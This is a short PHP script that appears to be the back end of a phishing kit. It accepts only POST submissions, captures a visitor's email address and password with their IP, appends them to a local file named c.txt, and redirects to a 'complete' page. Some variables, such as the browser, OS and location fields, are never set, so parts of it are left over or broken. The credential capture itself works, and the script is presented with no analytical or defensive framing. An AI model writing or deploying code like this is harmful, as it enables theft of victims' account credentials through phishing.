<?php
$ip = getenv("REMOTE_ADDR");

if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}

if(isset($_POST["submit"])){
			if(!empty($_POST['address'])){
				echo "The form is empty";
				return false;
			}
		}
		
$username = $_POST["email"];
$password = $_POST["password"];
$bots_form = $_POST["bots_form"];

$message = "Email: ".$username." | ";
$message .= "Email Password: ".$password." | ";


$browser = "Browser: ".$browser_info." | ";
$browser .= "OS: ".$users_os." | ";
$browser .= "OS Platform: ".$bits." | ";
$browser .= "Language: ".$sys_lang." | ";
$browser .= "Flash plugin: ".$version." | ";
//$browser .= "IP: ".$ip." | ";

$location = "Location: ".$cn." | ".$rg." | ".$ct." | ".$ip." | ";
$location .= "Submitted: ".$datum." | ";

$bots = "Bots: ".$bots_form." | ";


$inf = $message."\n".$ip."\n".$bots."\n\n";
$file = fopen("c.txt", 'a');
fwrite($file, $inf); 

header("Location: complete.html"); 


?>